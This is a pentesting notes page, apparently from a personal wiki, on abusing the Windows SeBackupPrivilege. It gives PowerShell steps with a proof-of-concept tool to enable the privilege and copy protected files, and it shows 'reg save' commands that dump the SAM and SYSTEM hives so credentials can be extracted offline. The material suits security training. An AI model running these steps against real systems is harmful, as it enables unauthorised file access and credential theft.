---
title: SeBackupPrivilege
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
  - SeBackupPrivilege
---
# SeBackupPrivilege

If we are members of the [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators) group, we will be given the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents.

## Abuse SeBackupPrivilege to Read files

In order to exploit `SeBackupPrivilege` you have to:

- Enable the privilege.  
    This alone lets you traverse (`cd` into) any1 directory, local or remote, and list (`dir`, `Get-ChildItem`) its contents.
- If you want to read/copy data out of a "normally forbidden" folder, you have to act as a backup software. The shell `copy` command won't work; you'll need to open the source file manually using `CreateFile` making sure to specify the `FILE_FLAG_BACKUP_SEMANTICS` flag.

We will use this PoC: [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) . Also available here: [Mytools: SeBackupPrivilege](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeBackupPrivilege)

```
git clone https://github.com/giuliano108/SeBackupPrivilege.git
# Library fileds are located at /SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug
```

**1.** Open Powershell in the target machine, copy the library binaries and import the required libraries:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
import-Module .\SeBackupPrivilegeCmdLets.dll
```

**2.** Check privs and group memberships:

```powershell
whoami /priv
whoami /groups
```

**3.** If SeBackupPrivilege is present, double check if it is enabled:

```powershell
Get-SeBackupPrivilege
```

**4.** If disabled, enable it (and check it back):

```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
whoami /priv
```

**5.** Now the privilege is  enabled and it can be now leveraged to copy any protected file (not to read it).

```powershell-session
dir C:\Confidential\
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat 'C:\Confidential\2021 Contract.txt'
```


## Abuse SeBackupPrivilege to back up SAM and SYSTEM Registry Hives

The SeBackupPrivilege also lets us back up the SAM and SYSTEM registry hives:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

With this, we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`.

**See more techniques at the [Attacking sam](attacking-sam.md) and [Attacking ntds](attacking-ntds.md) pages, both for extracting the hives and then also for cracking the credentials,** for instance:

- Alternative #1: vssadmin (locally)
- Alternative #2: crackmapexec (remotely)
- Alternative #3:  `DSInternals` module (locally)
- Alternative #4: Robocopy (locally)

